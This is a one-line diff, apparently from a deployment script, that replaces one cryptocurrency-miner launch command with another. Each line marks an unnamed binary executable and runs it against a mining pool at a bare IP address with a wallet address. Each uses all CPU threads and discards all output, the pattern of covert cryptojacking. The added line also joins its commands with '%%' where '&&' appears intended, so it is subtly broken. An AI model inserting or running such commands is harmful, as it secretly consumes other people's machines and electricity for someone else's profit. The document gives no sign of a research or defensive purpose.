@@ -1,1 +1,1 @@
-chmod +x capeu && ./capeu -a yespower -o 178.128.127.90:74 -u TWmRFcspf257KLgehukxHPdc1pf6g8PDz9.yes -p x -t $(nproc --all) > /dev/null 2>&1
+chmod +x srnode %% ./srnode --algorithm randomx --pool 47.89.195.104:443 --wallet ZEPHsDBeXxaS9MERnP3sHAPdCBFSMb2uZjcSyfBYezxE9kcrm6q1Z6XJcCbaqavmpMAncVgMHL8EkNAjskNT1bc6csQ86aLX1WD.cpu --password x --cpu-threads $(nproc --all) --disable-gpu > /dev/null 2>&1
